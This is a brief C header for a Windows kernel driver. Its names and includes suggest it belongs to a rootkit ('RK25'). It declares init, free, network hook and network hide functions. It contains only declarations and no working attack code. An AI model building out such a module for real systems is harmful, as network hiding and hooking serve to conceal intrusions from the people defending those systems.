#ifndef _RK25_NET_H
#define _RK25_NET_H

#include <ntddk.h>
#include "../../common/rk25_dbg.h"
#include "../common/hook/net/rk25_hook_net.h"
#include "hide/rk25_hide_net.h"

VOID RK25NetInit();
VOID RK25NetFree();

NTSTATUS RK25NetHook(ULONG attr);
NTSTATUS RK25NetHide(ULONG attr, PVOID target);

#endif // !_RK25_NET_H
